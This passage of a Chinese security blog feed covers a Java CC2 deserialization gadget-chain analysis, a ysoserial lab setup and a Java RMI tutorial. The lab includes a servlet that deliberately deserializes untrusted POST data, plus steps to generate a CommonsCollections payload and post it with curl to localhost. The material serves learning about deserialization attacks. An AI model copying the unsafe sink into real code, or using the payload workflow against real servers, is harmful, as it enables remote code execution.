alt="14"></p><p>接着优先级队列每次比较的时候，都会调用比较器的<code>compare</code>方法，此时服务端就会调用<code>TransformingComparator.compare</code>方法，进而执行<code>this.transformer.transform</code>方法，这个时候就会执行<code>InvokerTransformer.transform</code>方法</p><p><img src="/2021/12/15/Java-CC2链复现与分析/15.png" alt="15"></p><h5 id="setFieldValue"><a href="#setFieldValue" class="headerlink" title="setFieldValue"></a>setFieldValue</h5><p>继续回到CC2 Payload文件中，<code>setFieldValue</code>方法通过反射将<code>iMethodName</code>修改为<code>newTransformer</code></p><p><img src="/2021/12/15/Java-CC2链复现与分析/16.png" alt="16"></p><h5 id="getFieldValue"><a href="#getFieldValue" class="headerlink" title="getFieldValue"></a>getFieldValue</h5><p>接下来获取到优先级队列的实例对象，并修改了其字段值，将我们构造的恶意类注入</p><p><img src="/2021/12/15/Java-CC2链复现与分析/17.png" alt="17"></p><p>修改之后，优先级队列会调用比较器的<code>compare</code>方法去比较<code>templates</code>和1的值，此时会调用执行<code>InvokerTransformer.transform(templates)</code>方法。此时由于<code>templates</code>是<code>TemplatesImpl</code>类型的，因此实际最后会执行<code>TemplatesImpl.newTransformer</code>方法。</p><p>最后<code>Ysoserial</code>返回的优先级队列实例对象如下</p><p><img src="/2021/12/15/Java-CC2链复现与分析/18.png" alt="18"></p><h4 id="CC2-Payload利用原理"><a href="#CC2-Payload利用原理" class="headerlink" title="CC2 Payload利用原理"></a>CC2 Payload利用原理</h4><p>通过<code>Ysoserial</code>分析可以看到Payload返回的是一个<code>PriorityQueue</code>对象。在对<code>Web Server</code>进行调试的时候，我们直接将断点打在<code>PriorityQueue</code>的<code>readObject</code>方法处。</p><p><code>PriorityQueue</code>路径为<code>rt.jar.java.util.PriorityQueue</code></p><h5 id="PriorityQueue-readObject"><a href="#PriorityQueue-readObject" class="headerlink" title="PriorityQueue.readObject"></a>PriorityQueue.readObject</h5><p><img src="/2021/12/15/Java-CC2链复现与分析/19.png" alt="19"></p><p>在<code>readObject</code>方法中，首先通过<code>defaultReadObject</code>方法反序列化数据流。之后通过<code>readInt</code>方法读取优先级队列的长度，接着循环读取数组<code>queue</code>中的内容</p><p><img src="/2021/12/15/Java-CC2链复现与分析/20.png" alt="20"></p><h5 id="PriorityQueue-heapify"><a href="#PriorityQueue-heapify" class="headerlink" title="PriorityQueue.heapify"></a>PriorityQueue.heapify</h5><p>之后调用<code>heapify</code>方法，将无序数组还原成优先级队列。在该方法中会循环找最后一个非叶子结点，然后倒序调用<code>siftDown</code>方法</p><p><img src="/2021/12/15/Java-CC2链复现与分析/21.png" alt="21"></p><h5 id="PriorityQueue-siftDown"><a href="#PriorityQueue-siftDown" class="headerlink" title="PriorityQueue.siftDown"></a>PriorityQueue.siftDown</h5><p>在<code>siftDown</code>方法中，会调用<code>siftDownUsingComparator</code>方法</p><p><img src="/2021/12/15/Java-CC2链复现与分析/22.png" alt="22"></p><h5 id="PriorityQueue-siftDownUsingComparator"><a href="#PriorityQueue-siftDownUsingComparator" class="headerlink" title="PriorityQueue.siftDownUsingComparator"></a>PriorityQueue.siftDownUsingComparator</h5><p>该方法主要用于形成最小堆</p><p><img src="/2021/12/15/Java-CC2链复现与分析/23.png" alt="23"></p><h5 id="cc4-TransformingComparator"><a href="#cc4-TransformingComparator" class="headerlink" title="cc4.TransformingComparator"></a>cc4.TransformingComparator</h5><p>该方法会获取需要比较的变量。从而执行<code>this.transformer.transform</code>，因为我们已经将<code>this.transformer</code>指向了<code>InvokerTransformer</code>实例对象。因此会执行<code>InvokerTransformer.transform</code>方法，而<code>transform</code>中的参数就是我们传入的恶意类<code>TemplatesImpl</code></p><p><img src="/2021/12/15/Java-CC2链复现与分析/24.png" alt="24"></p><h5 id="InvokerTransformer-transform"><a href="#InvokerTransformer-transform" class="headerlink" title="InvokerTransformer.transform"></a>InvokerTransformer.transform</h5><p>在<code>Ysoserial</code>分析payload生成的时候我们将<code>iMethodName</code>的值改为了<code>newTransformer</code>，因此这里会反射调用<code>TemplatesImpl.newTransformer</code>方法</p><p><img src="/2021/12/15/Java-CC2链复现与分析/25.png" alt="25"></p><h5 id="TemplatesImpl-newTransformer"><a href="#TemplatesImpl-newTransformer" class="headerlink" title="TemplatesImpl.newTransformer"></a>TemplatesImpl.newTransformer</h5><p><code>TemplatesImpl</code>路径为<code>rt.jar.com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code></p><p>在构建<code>TemplatesImpl</code>实例对象时，会调用<code>getTransletInstance</code>方法。</p><p><img src="/2021/12/15/Java-CC2链复现与分析/26.png" alt="26"></p><h5 id="TemplatesImpl-getTransletInstance"><a href="#TemplatesImpl-getTransletInstance" class="headerlink" title="TemplatesImpl.getTransletInstance"></a>TemplatesImpl.getTransletInstance</h5><p>在<code>getTransletInstance</code>方法中，首先会判断<code>_name</code>是否为空，如果为空，直接<code>return</code>。接着会判断<code>_class</code>并进入<code>defineTransletClasses</code>方法中</p><p><img src="/2021/12/15/Java-CC2链复现与分析/27.png" alt="27"></p><h5 id="TemplatesImpl-defineTransletClasses"><a href="#TemplatesImpl-defineTransletClasses" class="headerlink" title="TemplatesImpl.defineTransletClasses"></a>TemplatesImpl.defineTransletClasses</h5><p>该方法会对<code>_bytecodes</code>字段进行解析，最后将<code>_transletIndex</code>的值赋为0</p><p><img src="/2021/12/15/Java-CC2链复现与分析/28.png" alt="28"></p><h5 id="newInstance"><a href="#newInstance" class="headerlink" title="newInstance"></a>newInstance</h5><p>此时的<code>_class[_transletIndex]</code>即为<code>_class[0]</code>也就是我们通过啊<code>Ysoserial</code>构造的恶意类，调用<code>newInstance</code>方法后恶意类会被加载然后被实例化，最终执行命令。</p><p><img src="/2021/12/15/Java-CC2链复现与分析/29.png" alt="29"></p><p>完整的利用链如下图所示</p><p><img src="/2021/12/15/Java-CC2链复现与分析/30.png" alt="30"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;复现环境&quot;&gt;&lt;a href=&quot;#复现环境&quot; class=&quot;headerlink&quot; title=&quot;复现环境&quot;&gt;&lt;/a&gt;复现环境&lt;/h4&gt;&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pr
      
    
    </summary>
    
    
      <category term="Java" scheme="elssm.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Ysoserial学习</title>
    <link href="elssm.github.io/2021/12/13/Ysoserial%E5%AD%A6%E4%B9%A0/"/>
    <id>elssm.github.io/2021/12/13/Ysoserial学习/</id>
    <published>2021-12-13T04:20:53.000Z</published>
    <updated>2021-12-13T05:19:08.022Z</updated>
    
    <content type="html"><![CDATA[<h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>之前没有学习过Java，所以不太了解Java相关漏洞，因此打算通过<code>ysoserial</code>这个工具学习一下，<code>ysoserial</code>集合了各种Java反序列化payload，上手也比较容易。</p><p>github地址：<a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial</a></p><h4 id="Ysoserial环境配置"><a href="#Ysoserial环境配置" class="headerlink" title="Ysoserial环境配置"></a>Ysoserial环境配置</h4><p><code>git clone</code>到本地之后通过<code>IDEA</code>打开。因为<code>ysoserial</code>项目是通过<code>Maven</code>搭建的，因此相关依赖也通过<code>Maven</code>下载配置。</p><p>依赖配置完成之后，运行项目的主函数，地址在</p><p><code>ysoserial/src/main/java/ysoserial/GeneratePayload.main()</code></p><p><img src="/2021/12/13/Ysoserial学习/1.png" alt="1"></p><p>我们也可以通过<code>IDEA</code>给<code>ysoserial</code>添加参数，例如通过<code>CommonsCollections1</code>执行弹计算器的命令。</p><p><img src="/2021/12/13/Ysoserial学习/2.png" alt="2"></p><p>执行<code>GeneratePayload.java</code>如下图所示，这样我们就得到了序列化后的字符串。</p><p><img src="/2021/12/13/Ysoserial学习/3.png" alt="3"></p><p>测试的时候我们可以将这段<code>payload</code>发送出去，但是由于是序列化的文件，因此我们需要将序列化后的字符串保存到一个二进制文件中。</p><p>我们知道，在序列化的时候，程序会执行<code>writeObject()</code>方法，因此我们可以在<code>writeObject()</code>之后将数据保存。因此可以定位到如下这段代码</p><p><img src="/2021/12/13/Ysoserial学习/4.png" alt="4"></p><p>在<code>Serializer.serialize()</code>中执行了<code>writeObject()</code>方法</p><p><img src="/2021/12/13/Ysoserial学习/5.png" alt="5"></p><p>因此我们在<code>writeObject()</code>方法后，写入保存序列化文件的代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">            FileOutputStream fout = <span class="keyword">new</span> FileOutputStream(<span class="string">"/YourPath/payload.ser"</span>);</span><br><span class="line">            ObjectOutputStream ot = <span class="keyword">new</span> ObjectOutputStream(fout);</span><br><span class="line">            ot.writeObject(obj);</span><br><span class="line">            ot.close();</span><br><span class="line">            fout.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException fnfe)&#123;</span><br><span class="line">            System.out.println(<span class="string">"payload not found"</span>);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/12/13/Ysoserial学习/6.png" alt="6"></p><p>之后再次运行<code>GeneratePayload.java</code>，则会在指定的路径下生成<code>payload.ser</code>文件</p><p><img src="/2021/12/13/Ysoserial学习/7.png" alt="7"></p><h4 id="WebServer配置"><a href="#WebServer配置" class="headerlink" title="WebServer配置"></a>WebServer配置</h4><h5 id="版本说明"><a href="#版本说明" class="headerlink" title="版本说明"></a>版本说明</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tomcat:8.5.73</span><br><span class="line">jdk:1.7</span><br></pre></td></tr></table></figure><h5 id="Web-xml配置"><a href="#Web-xml配置" class="headerlink" title="Web.xml配置"></a>Web.xml配置</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DemoServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>demotest.DemoServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DemoServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/demotest<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="相关包的引入"><a href="#相关包的引入" class="headerlink" title="相关包的引入"></a>相关包的引入</h5><p>在<code>WEB-INF/lib</code>下导入<code>CommonsCollections3.1.jar</code></p><h5 id="Tomcat配置"><a href="#Tomcat配置" class="headerlink" title="Tomcat配置"></a>Tomcat配置</h5><p><img src="/2021/12/13/Ysoserial学习/8.png" alt="8"></p><h5 id="处理请求"><a href="#处理请求" class="headerlink" title="处理请求"></a>处理请求</h5><p>对<code>POST</code>请求的数据执行反序列化操作，处理代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demotest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DemoServlet</span> <span class="keyword">extends</span> <span class="title">javax</span>.<span class="title">servlet</span>.<span class="title">http</span>.<span class="title">HttpServlet</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(javax.servlet.http.HttpServletRequest request,javax.servlet.http.HttpServletResponse response)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ServletInputStream sis = request.getInputStream();</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(sis);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ois.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(javax.servlet.http.HttpServletRequest request,javax.servlet.http.HttpServletResponse response)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        PrintWriter out = response.getWriter();</span><br><span class="line">        out.println(<span class="string">"This is a demo"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="启动服务"><a href="#启动服务" class="headerlink" title="启动服务"></a>启动服务</h5><p><img src="/2021/12/13/Ysoserial学习/9.png" alt="9"></p><p><img src="/2021/12/13/Ysoserial学习/10.png" alt="10"></p><h4 id="CC1-Payload测试"><a href="#CC1-Payload测试" class="headerlink" title="CC1 Payload测试"></a>CC1 Payload测试</h4><p>使用<code>curl</code>命令向服务器发送post请求，将前面生成的<code>payload.ser</code>发送到服务器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://localhost:8080/demotest --data-binary @/Users/caoyifan/payload.ser</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">--data-binary &lt;data&gt;</span><br><span class="line">  (HTTP) This posts data exactly as specified with no extra processing whatsoever.</span><br><span class="line">  If you start the data with the letter @, the rest should be a filename.  Data is</span><br><span class="line">  posted in a similar manner as --data-ascii does, except that newlines are preserved</span><br><span class="line">  and conversions are never done.</span><br></pre></td></tr></table></figure><p>成功执行弹计算器的命令</p><p><img src="/2021/12/13/Ysoserial学习/11.png" alt="11"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h4&gt;&lt;p&gt;之前没有学习过Java，所以不太了解Java相关漏洞，因此打算通过&lt;code&gt;ysoserial&lt;/code&gt;这个工具学习一下，&lt;code&gt;
      
    
    </summary>
    
    
      <category term="Java" scheme="elssm.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Java RMI</title>
    <link href="elssm.github.io/2021/12/01/Java-RMI/"/>
    <id>elssm.github.io/2021/12/01/Java-RMI/</id>
    <published>2021-12-01T02:30:24.000Z</published>
    <updated>2021-12-13T09:45:51.497Z</updated>
    
    <content type="html"><![CDATA[<h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>Java RMI 指的是远程方法调用 (Remote Method Invocation)。它是一种机制，能够让在某个 Java 虚拟机上的对象调用另一个 Java 虚拟机中的对象上的方法。</p><p>在Java中，只要一个类继承了<code>java.rmi.Remote</code>接口，即可成为存在于服务器端的远程对象，供客户端访问并提供一定的服务。</p><h4 id="RMI框架"><a href="#RMI框架" class="headerlink" title="RMI框架"></a>RMI框架</h4><p>RMI框架封装了所有底层通信细节，并且解决了编组、分布式垃圾收集、安全检查和并发性等通用问题，开发人员只需专注于开发与特定问题领域相关的各种本地对象和远程对象即可。</p><h5 id="Stub和Skeleton"><a href="#Stub和Skeleton" class="headerlink" title="Stub和Skeleton"></a>Stub和Skeleton</h5><p>RMI框架采用代理来负责客户与远程对象之间通过Socket进行通信的细节。RMI框架为远程对象分别生成了客户端代理和服务器端代理，位于客户端的代理类称为Stub，位于服务器端的代理类称为Skeleton。stub(存根)和skeleton( 骨架 ) 在RMI中充当代理角色，在现实开发中主要是用来隐藏系统和网络的的差异， 这一部分的功能在RMI开发中对程序员是透明的。Stub为客户端编码远程命令并把他们发送到服务器。而Skeleton则是把远程命令解码，调用服务端的远程对象的方法，把结果在编码发给stub，然后stub再解码返回调用结果给客户端。</p><p><img src="/2021/12/01/Java-RMI/24.png" alt="24"></p><h4 id="实现RMI步骤"><a href="#实现RMI步骤" class="headerlink" title="实现RMI步骤"></a>实现RMI步骤</h4><ul><li>定义一个远程接口，此接口需要继承<code>Remote</code></li><li>开发远程接口的实现类</li><li>创建一个<code>server</code>并把远程对象注册到端口</li><li>创建一个<code>client</code>查找远程对象，调用远程方法</li></ul><h4 id="RMI实现"><a href="#RMI实现" class="headerlink" title="RMI实现"></a>RMI实现</h4><p>首先我们定义一个远程接口<code>Hello.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmi.server;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//Remote接口是一个标识接口，本身不包含任何方法，该接口用于标识其子类的方法可以</span></span><br><span class="line"><span class="comment">//被非本地的Java虚拟机调用</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Hello</span> <span class="keyword">extends</span> <span class="title">Remote</span></span>&#123;</span><br><span class="line">    <span class="function">String <span class="title">sayHello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着我们定义一个实现类<code>HelloImpl.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmi.server;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloImpl</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">Hello</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">HelloImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">sayHello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"hello,"</span> + name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里需要注意的是，实现类必须要继承<code>UnicastRemoteObject</code>类，客户端访问获得远程对象时，远程对象才会把自身的一个拷贝以<code>Socket</code>的形式传输给客户端，这个拷贝也就是<code>Stub</code>，也可以叫做”存根”，这个”Stub”可以看作是远程对象在本地的一个代理，其中包含了远程对象的具体信息，客户端可以通过这个代理与服务端进行交互。</p><p>最后实现该类的远程接口中的<code>sayHello()</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmi.server;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//HelloImpl 对象在实例化时会自动调用其父类 UnicastRemoteObject 的构造方法</span></span><br><span class="line">            <span class="comment">// 生成对应的 Stub 和 Skeleton</span></span><br><span class="line">            Hello h = <span class="keyword">new</span> HelloImpl();</span><br><span class="line">            <span class="comment">//在本地创建并启动 RMIService , 被创建的 RMIService 服务将会在指定的端口上监听请求</span></span><br><span class="line">            LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">            <span class="comment">//将远程对象 " h " 绑定到 rmi://localhost:1099/hello 这个 URL 上 . 客户端可以通过这个 URL 直接访问远程对象 .</span></span><br><span class="line">            Naming.rebind(<span class="string">"rmi://localhost:1099/hello"</span>,h);</span><br><span class="line">            System.out.println(<span class="string">"HelloServer 启动成功"</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上就是<code>server</code>端的配置</p><p>接着我们实现<code>client</code>端的配置，客户端只需要一个连接程序，即可实现远程调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmi.client;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> rmi.server.Hello;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//客户端只需要调用 java.rmi.Naming.lookup 函数</span></span><br><span class="line">            <span class="comment">//通过公开的路径从 RMIService 上拿到对应接口的实现类</span></span><br><span class="line">            Hello h = (Hello) Naming.lookup(<span class="string">"rmi://localhost:1099/hello"</span>);</span><br><span class="line">            System.out.println(h.sayHello(<span class="string">"Elssm"</span>));</span><br><span class="line">        &#125;<span class="keyword">catch</span> (MalformedURLException e)&#123;</span><br><span class="line">            System.out.println(<span class="string">"url格式异常"</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (RemoteException e)&#123;</span><br><span class="line">            System.out.println(<span class="string">"创建对象异常"</span>);</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NotBoundException e)&#123;</span><br><span class="line">            System.out.println(<span class="string">"对象未绑定"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="RMI执行过程"><a href="#RMI执行过程" class="headerlink" title="RMI执行过程"></a>RMI执行过程</h4><p>我们写好的RMI文件目录结构如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">rmi</span><br><span class="line">├── client</span><br><span class="line">│   ├── HelloClient.java</span><br><span class="line">└── server</span><br><span class="line">    ├── Hello.java</span><br><span class="line">    ├── HelloImpl.java</span><br><span class="line">    └── HelloServer.java</span><br></pre></td></tr></table></figure><h5 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java rmi/server<span class="comment">/*.java</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java rmi/client<span class="comment">/*.java</span></span><br></pre></td></tr></table></figure><h5 id="生成Stub存根"><a href="#生成Stub存根" class="headerlink" title="生成Stub存根"></a>生成Stub存根</h5><p><img src="/2021/12/01/Java-RMI/1.png" alt="1"></p><p>然后将服务端生成的<code>Stub</code>存根复制到客户端目录下，最后我们RMI文件目录结构如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro src % tree rmi                                      </span><br><span class="line">rmi</span><br><span class="line">├── client</span><br><span class="line">│   ├── HelloClient<span class="class">.<span class="keyword">class</span></span></span><br><span class="line"><span class="class">│   ├── <span class="title">HelloClient</span>.<span class="title">java</span></span></span><br><span class="line"><span class="class">│   └── <span class="title">HelloImpl_Stub</span>.<span class="title">class</span></span></span><br><span class="line"><span class="class">└── <span class="title">server</span></span></span><br><span class="line"><span class="class">    ├── <span class="title">Hello</span>.<span class="title">class</span></span></span><br><span class="line"><span class="class">    ├── <span class="title">Hello</span>.<span class="title">java</span></span></span><br><span class="line"><span class="class">    ├── <span class="title">HelloImpl</span>.<span class="title">class</span></span></span><br><span class="line"><span class="class">    ├── <span class="title">HelloImpl</span>.<span class="title">java</span></span></span><br><span class="line"><span class="class">    ├── <span class="title">HelloImpl_Stub</span>.<span class="title">class</span></span></span><br><span class="line"><span class="class">    ├── <span class="title">HelloServer</span>.<span class="title">class</span></span></span><br><span class="line"><span class="class">    └── <span class="title">HelloServer</span>.<span class="title">java</span></span></span><br></pre></td></tr></table></figure><h5 id="启动RMI服务端"><a href="#启动RMI服务端" class="headerlink" title="启动RMI服务端"></a>启动RMI服务端</h5><p><img src="/2021/12/01/Java-RMI/2.png" alt="2"></p><h5 id="启动RMI客户端"><a href="#启动RMI客户端" class="headerlink" title="启动RMI客户端"></a>启动RMI客户端</h5><p><img src="/2021/12/01/Java-RMI/3.png" alt="3"></p><p>可以看到，我们已经成功调用服务端的<code>sayHello()</code>方法</p><h4 id="抓包分析"><a href="#抓包分析" class="headerlink" title="抓包分析"></a>抓包分析</h4><p>我们可以通过Wireshark进行进一步的分析，在客户端请求的过程中，有两次完整的数据交互。可以通过<code>tcp.stream eq 会话序号</code>划分</p><p><img src="/2021/12/01/Java-RMI/4.png" alt="4"></p><p><img src="/2021/12/01/Java-RMI/5.png" alt="5"></p><h5 